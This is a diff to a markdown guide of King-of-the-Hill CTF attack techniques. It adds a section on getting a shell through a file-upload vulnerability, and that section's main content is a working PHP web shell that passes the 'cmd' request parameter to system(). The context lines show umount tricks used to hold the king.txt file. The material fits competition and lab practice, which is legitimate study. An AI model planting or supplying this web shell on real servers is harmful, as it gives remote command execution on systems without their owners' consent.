@@ -156,6 +156,25 @@ gcc chattr.c -o chattr
 umount -l /root
 umount -l /root/king.txt 
 ```
- 
+## PHP Web CMD Shell
+
+**Get Shell by exploiting file upload Vulnerability**
+
+![Web-CMD-shell-search](https://github.com/DevVj-1/Koth-Hacker-Vs-Hacker_Techniques-/assets/106962581/eb2697f2-7a85-4744-90ae-a7337e52b134)
+
+
+```
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+```
+
+
 
 
